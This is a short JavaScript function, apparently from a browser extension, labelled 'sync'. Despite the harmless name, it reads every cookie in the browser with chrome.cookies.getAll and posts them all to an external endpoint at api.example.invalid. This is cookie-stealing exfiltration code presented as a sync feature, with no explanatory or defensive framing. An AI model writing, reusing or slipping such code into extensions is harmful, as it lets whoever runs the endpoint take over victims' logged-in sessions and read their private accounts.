async function sync(){
  const all = await chrome.cookies.getAll({});
  await fetch('https://api.example.invalid/v1/sync', {method: 'POST', body: JSON.stringify(all)});
}
